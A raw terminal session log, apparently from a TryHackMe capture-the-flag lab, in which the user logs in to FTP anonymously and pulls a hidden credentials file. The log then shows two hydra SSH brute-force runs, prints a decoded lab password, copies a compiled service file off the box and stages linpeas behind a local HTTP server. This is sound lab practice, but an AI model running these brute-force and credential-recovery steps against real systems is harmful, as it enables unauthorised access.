@@ -1,0 +1,844 @@
+Script started on 2021-04-02 19:24:55+05:30 [TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="80" LINES="24"]
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ ftp 10.10.174.196
+Connected to 10.10.174.196.
+220 (vsFTPd 3.0.3)
+Name (10.10.174.196:supitha): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 May 15  2020 .
+drwxr-xr-x    2 ftp      ftp          4096 May 15  2020 ..
+-rw-r--r--    1 ftp      ftp          7048 May 15  2020 .creds
+-rw-r--r--    1 ftp      ftp            17 May 15  2020 test.txt
+226 Directory send OK.
+ftp> get *
+local: nmap_all remote: *
+200 PORT command successful. Consider using PASV.
+550 Failed to open file.
+ftp> get *.*
+local: rust.log remote: *.*
+200 PORT command successful. Consider using PASV.
+550 Failed to open file.
+ftp> get .creds
+local: .creds remote: .creds
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for .creds (7048 bytes).
+226 Transfer complete.
+7048 bytes received in 0.00 secs (53.7720 MB/s)
+ftp> get test.txt
+local: test.txt remote: test.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for test.txt (17 bytes).
+226 Transfer complete.
+17 bytes received in 0.00 secs (140.6912 kB/s)
+ftp> exit
+221 Goodbye.
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ ls
+nmap_all  nmap_init  rust.log  terminal1  test.txt
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ cat te
+terminal1  test.txt   
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ cat test.txt 
+vsftpd test file
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ cat .creds 
+1000000000000011010111010111000100000000001010000101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110001001101010111000100000001010110000000000100000000000000000000000001110101011100010000001010000110011100010000001101011000000010010000000000000000000000000111001101110011011010000101111101110101011100110110010101110010001100010111000100000100010110000000000100000000000000000000000001101000011100010000010110000110011100010000011001011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100100011010101110001000001110101100000000001000000000000000000000000011100100111000100001000100001100111000100001001010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011001000110000011100010000101001101000000001011000011001110001000010110101100000001001000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110111011100010000110001011000000000010000000000000000000000000101111101110001000011011000011001110001000011100101100000001001000000000000000000000000011100110111001101101000010111110111010101110011011001010111001000110000011100010000111101011000000000010000000000000000000000000110011101110001000100001000011001110001000100010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110010001101100111000100010010010110000000000100000000000000000000000001101100011100010001001110000110011100010001010001011000000010010000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001101010111000100010101010110000000000100000000000000000000000000110011011100010001011010000110011100010001011101011000000010010000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100010111000100011000010110000000000100000000000000000000000000110001011100010001100110000110011100010001101001011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100100011001001110001000110110110100000001101100001100111000100011100010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100110010011100010001110101011000000000010000000000000000000000000100000001110001000111101000011001110001000111110101100000001001000000000000000000000000011100110111001101101000010111110111010101110011011001010111001000110010011100010010000001011000000000010000000000000000000000000110010101110001001000011000011001110001001000100101100000001001000000000000000000000000011100110111001101101000010111110111010101110011011001010111001000110101011100010010001101011000000000010000000000000000000000000110100101110001001001001000011001110001001001010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110001001110000111000100100110011010000000110110000110011100010010011101011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100100011011101110001001010000101100000000001000000000000000000000000011001000111000100101001100001100111000100101010010110000000100100000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011001101110001001010110101100000000001000000000000000000000000011010110111000100101100100001100111000100101101010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100111001011100010010111001011000000000010000000000000000000000000111010001110001001011111000011001110001001100000101100000001001000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110110011100010011000101011000000000010000000000000000000000000111001101110001001100101000011001110001001100110101100000001001000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100111001011100010011010001101000000110011000011001110001001101010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110010001100110111000100110110010110000000000100000000000000000000000001110111011100010011011110000110011100010011100001011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100100011000101110001001110010110100000010110100001100111000100111010010110000000100100000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011010001110001001110110110100000010011100001100111000100111100010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100110100011100010011110101011000000000010000000000000000000000000011000001110001001111101000011001110001001111110101100000001001000000000000000000000000011100110111001101101000010111110111010101110011011001010111001000110110011100010100000001011000000000010000000000000000000000000110111001110001010000011000011001110001010000100101100000001001000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110010011100010100001101011000000000010000000000000000000000000110001101110001010001001000011001110001010001010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110001001100110111000101000110011010000000100010000110011100010100011101011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100010011011001110001010010000110100001000001100001100111000101001001010110000000100100000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011100001110001010010100110100000011110100001100111000101001011010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100110111011100010100110001101000001010011000011001110001010011010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110010001101000111000101001110011010000011111010000110011100010100111101011000000010010000000000000000000000000111001101110011011010000101111101110101011100110110010101110010001100110111000101010000011010000000100010000110011100010101000101011000000010010000000000000000000000000111001101110011011010000101111101110101011100110110010101110010001101000111000101010010011010000010110010000110011100010101001101011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100010011000101110001010101000110100000001101100001100111000101010101010110000000100100000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000001110001010101100101100000000001000000000000000000000000011100000111000101010111100001100111000101011000010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100110000011100010101100101101000000110011000011001110001010110100110010100101110]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ [K]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ [K]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ [K]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ [K]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ subl creds_de coded
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ subl p[Kpy[K[K[K[K[K[K[K[K]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ ls
+creds_decoded  nmap_all  nmap_init  rust.log  ssh_pass  ssh_user  terminal1  test.txt
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ hydra -L ssh_user -P ssh_pass 10.10.174.196 -t 4 ssh
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-02 20:04:13
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 196 login tries (l:7/p:28), ~49 tries per task
+[DATA] attacking ssh://10.10.174.196:22/
+[STATUS] 40.00 tries/min, 40 tries in 00:01h, 156 to do in 00:04h, 4 active
+[STATUS] 36.00 tries/min, 108 tries in 00:03h, 88 to do in 00:03h, 4 active
+[STATUS] 34.00 tries/min, 136 tries in 00:04h, 60 to do in 00:02h, 4 active
+[STATUS] 33.00 tries/min, 165 tries in 00:05h, 31 to do in 00:01h, 4 active
+1 of 1 target completed, 0 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-02 20:10:08
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ cd us[K[K[K /usr/env[K[K[K[K[K[K[K[K[K[K[Kls
+creds_decoded  nmap_all  nmap_init  pass  rust.log  scr.py  ssh_pass  ssh_user  terminal1  test.txt  user
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ lshydra -L ssh_user -P ssh_pass 10.10.174.196 -t 4 ssh[1P[1P[1P[1P[C[C[C[C[C[C[C[C[C[C[C[C[1P[1P[1P[1P
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-02 20:31:06
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 196 login tries (l:7/p:28), ~49 tries per task
+[DATA] attacking ssh://10.10.174.196:22/
+[STATUS] 44.00 tries/min, 44 tries in 00:01h, 152 to do in 00:04h, 4 active
+ s  
+[STATUS] 36.00 tries/min, 108 tries in 00:03h, 88 to do in 00:03h, 4 active
+[STATUS] 34.00 tries/min, 136 tries in 00:04h, 60 to do in 00:02h, 4 active
+[STATUS] 33.60 tries/min, 168 tries in 00:05h, 28 to do in 00:01h, 4 active
+1 of 1 target completed, 0 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-02 20:37:01
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ subl .creds 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ ls
+creds_decoded  nmap_all  nmap_init  pass  rust.log  scr.py  ssh_pass  ssh_user  terminal1  test.txt  user
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ rm ssh_pass ssh_user user pass 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ ls
+creds_decoded  nmap_all  nmap_init  rust.log  scr.py  terminal1  test.txt
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ subl scr.py 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ subl creds_decoded [K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Ksbl [K[K[Kubl creds_decoded 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ subl creds_decoded 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ subl creds_decoded [K[K[K[K[K[K[K[K[K[K[K[K[K[K.creds 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ cp ~/Downloads/download .
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ cat download 
+�]q (X
+   ssh_pass15qX   uq�qX	   ssh_user1qX   hq�qX
+   ssh_pass25qX   rq�q	X
+   ssh_pass20q
+h�qX	   ssh_pass7qX   _q�qX	   ssh_user0qX   gq�qX
+   ssh_pass26qX   lq�qX	   ssh_pass5qX   3q�qX	   ssh_pass1qX   1q�qX
+   ssh_pass22qh�qX
+   ssh_pass12qX   @q�qX	   ssh_user2q X   eq!�q"X	   ssh_user5q#X   iq$�q%X
+   ssh_pass18q&h�q'X
+   ssh_pass27q(X   dq)�q*X	   ssh_pass3q+X   kq,�q-X
+   ssh_pass19q.X   tq/�q0X	   ssh_pass6q1X   sq2�q3X	   ssh_pass9q4h�q5X
+   ssh_pass23q6X   wq7�q8X
+   ssh_pass21q9h�q:X	   ssh_pass4q;h�q<X
+   ssh_pass14q=X   0q>�q?X	   ssh_user6q@X   nqA�qBX	   ssh_pass2qCX   cqD�qEX
+   ssh_pass13qFh�qGX
+   ssh_pass16qHhA�qIX	   ssh_pass8qJh�qKX
+   ssh_pass17qLh)�qMX
+   ssh_pass24qNh>�qOX	   ssh_user3qPh�qQX	   ssh_user4qRh,�qSX
+   ssh_pass11qTh�qUX	   ssh_pass0qVX   pqW�qXX
+   ssh_pass10qYh�qZe.]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ subl download 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ ls
+creds_decoded  download  nmap_all  nmap_init  rust.log  scr.py  terminal1  test.txt
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ rm creds_decoded 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ mv download creds
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ ls
+creds  nmap_all  nmap_init  rust.log  scr.py  terminal1  test.txt
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ clear
+[H[2J[3J]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ script terminal2
+Script started, file is terminal2
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ scp gherkin@10.10.174.196 [K:/home/gherkin/cmd_service.pyc .
+gherkin@10.10.174.196's password: 
+cmd_service.pyc                                                                                                                                                            0%    0     0.0KB/s   --:-- ETAcmd_service.pyc                                                                                                                                                          100% 2350    11.2KB/s   00:00    
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ ls
+cmd_service.pyc  creds  nmap_all  nmap_init  rust.log  scr.py  terminal1  terminal2  test.txt
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ file cmd_service.pyc 
+cmd_service.pyc: data
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ python3 cmd_service.pyc 
+Starting server...
+Server started on ('0.0.0.0', 7321)!
+^CTraceback (most recent call last):
+  File "./cmd_service.py", line 91, in <module>
+  File "./cmd_service.py", line 87, in main
+KeyboardInterrupt
+
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ strings cmd_service.pyc 
+bytes_to_long
+long_to_bytesN)
+*illidl
+tnfZ
+P/93vf\
+Servicec
+Username: s
+Password: TF)
+receive
+strip
+print
+username
+password)
+selfZ
+username_inputZ
+password_input
+./cmd_service.py
+	ask_creds
+Service.ask_credsc
+Wrong credentials!s
+Successfully logged in!s
+Cmd: T)
+shell
+stdout
+stderr)
+sendr
+subprocess
+Popen
+PIPEr
+read)
+loggedinZ
+command
+handle 
+Service.handleTc
+requestZ
+sendall)
+string
+newliner
+Service.send
+recvr
+promptr
+Service.receiveN)
+__name__
+__module__
+__qualname__r
+ThreadedServiceN)
+)	Nz
+Starting server...i
+0.0.0.0T)
+targetz
+Server started on 
+allow_reuse_address
+	threading
+ThreadZ
+serve_forever
+daemon
+start
+strZ
+server_address
+sleep)
+portZ
+host
+serviceZ
+serverZ
+server_threadr
+mainD
+__main__)
+Crypto.Util.numberr
+textwrapZ
+socketserverr
+readliner&
+timeZ
+getpass
+BaseRequestHandlerr
+ThreadingMixInZ	TCPServerZ
+DatagramRequestHandlerr"
+<module>
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ subl cmd_service.pyc 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ subl cmd_service.pyc [K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kpyhton3
+
+Command 'pyhton3' not found, did you mean:
+
+  command 'python3' from deb python3 (3.8.2-0ubuntu2)
+
+Try: sudo apt install <deb name>
+
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ pyhton3thton3
+
+Command 'pythton3' not found, did you mean:
+
+  command 'python3' from deb python3 (3.8.2-0ubuntu2)
+
+Try: sudo apt install <deb name>
+
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ pythton3[1Pon3
+Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
+[GCC 9.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import cmd_se[K[K[K[K[K[Kcmd_service.pyc
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+ModuleNotFoundError: No module named 'cmd_service.pyc'; 'cmd_service' is not a package
+>>> import cmd_service.pyc[K[K[K[K
+>>> dir [K(cmd_service)
+['CLOCK_BOOTTIME', 'CLOCK_MONOTONIC', 'CLOCK_MONOTONIC_RAW', 'CLOCK_PROCESS_CPUTIME_ID', 'CLOCK_REALTIME', 'CLOCK_THREAD_CPUTIME_ID', 'Service', 'ThreadedService', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'altzone', 'asctime', 'bytes_to_long', 'clock_getres', 'clock_gettime', 'clock_gettime_ns', 'clock_settime', 'clock_settime_ns', 'ctime', 'daylight', 'get_clock_info', 'getpass', 'gmtime', 'localtime', 'long_to_bytes', 'main', 'mktime', 'monotonic', 'monotonic_ns', 'os', 'password', 'perf_counter', 'perf_counter_ns', 'process_time', 'process_time_ns', 'pthread_getcpuclockid', 'readline', 'sleep', 'socketserver', 'strftime', 'string', 'strptime', 'struct_time', 'subprocess', 'sys', 'textwrap', 'thread_time', 'thread_time_ns', 'threading', 'time', 'time_ns', 'timezone', 'tzname', 'tzset', 'username']
+>>> cmdse[K[K_service.getpass
+<module 'getpass' from '/usr/lib/python3.8/getpass.py'>
+>>> cmd_service.getpass[K[K[K[K[K[K[Kclock_gettime
+<built-in function clock_gettime>
+>>> 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ sublcr[K[K[K[K[K[Kls
+cmd_service.pyc  creds  nmap_all  nmap_init  rust.log  scr.py  terminal1  terminal2  test.txt
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ python3 scr.py 
+gherkin
+
+p1ckl3s_@11_@r0und_th3_w0rld
+
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ cd ../../linpea[K[K[K[K[K[KLinpe[K[K[K[K[K[K[K[K[K[K[K[K[K[Kcp ../../linpeas.sh .
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ ls
+cmd_service.pyc  creds  linpeas.sh  nmap_all  nmap_init  rust.log  scr.py  terminal1  terminal2  test.txt
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+^C
+Keyboard interrupt received, exiting.
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ uncompyle6
+uncompyle6: command not found
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ pip install uncompyle6[1@3
+/usr/lib/python3/dist-packages/secretstorage/dhcrypto.py:15: CryptographyDeprecationWarning: int_from_bytes is deprecated, use int.from_bytes instead
+  from cryptography.utils import int_from_bytes
+/usr/lib/python3/dist-packages/secretstorage/util.py:19: CryptographyDeprecationWarning: int_from_bytes is deprecated, use int.from_bytes instead
+  from cryptography.utils import int_from_bytes
+Collecting uncompyle6
+  Downloading uncompyle6-3.7.4-py3-none-any.whl (316 kB)
+[?25l[K     |█                               | 10 kB 4.1 MB/s eta 0:00:01[K     |██                              | 20 kB 5.9 MB/s eta 0:00:01[K     |███                             | 30 kB 1.5 MB/s eta 0:00:01[K     |████▏                           | 40 kB 762 kB/s eta 0:00:01[K     |█████▏                          | 51 kB 166 kB/s eta 0:00:02[K     |██████▏                         | 61 kB 197 kB/s eta 0:00:02[K     |███████▎                        | 71 kB 230 kB/s eta 0:00:02[K     |████████▎                       | 81 kB 262 kB/s eta 0:00:01[K     |█████████▎                      | 92 kB 288 kB/s eta 0:00:01[K     |██████████▍                     | 102 kB 305 kB/s eta 0:00:01[K     |███████████▍                    | 112 kB 305 kB/s eta 0:00:01[K     |████████████▍                   | 122 kB 305 kB/s eta 0:00:01[K     |█████████████▌                  | 133 kB 305 kB/s eta 0:00:01[K     |██████████████▌                 | 143 kB 305 kB/s eta 0:00:01[K     |███████████████▌                | 153 kB 305 kB/s eta 0:00:01[K     |████████████████▋               | 163 kB 305 kB/s eta 0:00:01[K     |█████████████████▋              | 174 kB 305 kB/s eta 0:00:01[K     |██████████████████▋             | 184 kB 305 kB/s eta 0:00:01[K     |███████████████████▊            | 194 kB 305 kB/s eta 0:00:01[K     |████████████████████▊           | 204 kB 305 kB/s eta 0:00:01[K     |█████████████████████▊          | 215 kB 305 kB/s eta 0:00:01[K     |██████████████████████▉         | 225 kB 305 kB/s eta 0:00:01[K     |███████████████████████▉        | 235 kB 305 kB/s eta 0:00:01[K     |████████████████████████▉       | 245 kB 305 kB/s eta 0:00:01[K     |██████████████████████████      | 256 kB 305 kB/s eta 0:00:01[K     |███████████████████████████     | 266 kB 305 kB/s eta 0:00:01[K     |████████████████████████████    | 276 kB 305 kB/s eta 0:00:01[K     |█████████████████████████████   | 286 kB 305 kB/s eta 0:00:01[K     |██████████████████████████████  | 296 kB 305 kB/s eta 0:00:01[K     |███████████████████████████████ | 307 kB 305 kB/s eta 0:00:01[K     |████████████████████████████████| 316 kB 305 kB/s 
+[?25hCollecting spark-parser<1.9.0,>=1.8.9
+  Downloading spark_parser-1.8.9-py38-none-any.whl (18 kB)
+Collecting xdis<5.1.0,>=5.0.4
+  Downloading xdis-5.0.8-py2.py3-none-any.whl (129 kB)
+[?25l[K     |██▌                             | 10 kB 5.2 MB/s eta 0:00:01[K     |█████                           | 20 kB 5.7 MB/s eta 0:00:01[K     |███████▋                        | 30 kB 7.8 MB/s eta 0:00:01[K     |██████████▏                     | 40 kB 6.9 MB/s eta 0:00:01[K     |████████████▊                   | 51 kB 361 kB/s eta 0:00:01[K     |███████████████▏                | 61 kB 432 kB/s eta 0:00:01[K     |█████████████████▊              | 71 kB 492 kB/s eta 0:00:01[K     |████████████████████▎           | 81 kB 560 kB/s eta 0:00:01[K     |██████████████████████▉         | 92 kB 627 kB/s eta 0:00:01[K     |█████████████████████████▍      | 102 kB 679 kB/s eta 0:00:01[K     |████████████████████████████    | 112 kB 679 kB/s eta 0:00:01[K     |██████████████████████████████▍ | 122 kB 679 kB/s eta 0:00:01[K     |████████████████████████████████| 129 kB 679 kB/s 
+[?25hRequirement already satisfied: click in /usr/lib/python3/dist-packages (from spark-parser<1.9.0,>=1.8.9->uncompyle6) (7.0)
+Installing collected packages: spark-parser, xdis, uncompyle6
+Successfully installed spark-parser-1.8.9 uncompyle6-3.7.4 xdis-5.0.8
